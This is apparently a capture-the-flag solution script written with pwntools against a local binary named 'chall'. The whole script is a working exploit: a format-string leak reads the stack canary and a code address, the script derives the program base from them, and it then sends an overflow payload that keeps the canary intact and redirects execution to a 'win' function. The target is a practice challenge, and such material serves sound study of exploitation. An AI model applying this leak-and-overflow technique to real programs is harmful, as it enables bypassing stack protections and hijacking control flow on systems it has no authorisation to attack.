from pwn import *

elf = context.binary = ELF('./chall')
p = process(elf.path)

# canary:       %13$p
# base address: %17$p

printf = '%13$p.%17$p'
p.recvuntil(b'name:')
p.sendline(printf)

p.recvuntil(b', ')
canary = int(p.recv(18).decode().split('.')[0], 16)
main_addr = int(p.recv(19).decode()[1:].split('.')[0], 16)

base_addr = main_addr - 0x1637
win_addr = base_addr + 0x1619

payload = b'A' * 24
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
